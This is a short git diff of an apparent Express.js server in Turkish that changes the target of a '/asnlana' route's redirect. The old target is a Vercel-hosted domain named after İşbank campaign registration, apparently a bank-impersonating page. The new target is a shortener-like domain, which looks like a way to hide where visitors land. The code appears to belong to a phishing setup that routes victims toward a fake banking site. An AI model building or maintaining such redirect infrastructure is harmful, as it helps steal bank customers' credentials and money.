@@ -80,10 +80,10 @@ app.get('/kayit', (req, res) => {
 
 
  app.get('/asnlana', (req, res) => {
-    // notifyVisitorLogin fonksiyonu yerine istediğiniz işlemleri ekleyebilirsiniz
+    // https://isbank-kampanyalar-kayit.vercel.app/
 
     // Kullanıcıyı yönlendir
-    res.redirect('https://isbank-kampanyalar-kayit.vercel.app/');
+    res.redirect('https://shortli-xi.vercel.app');
 });
 
 
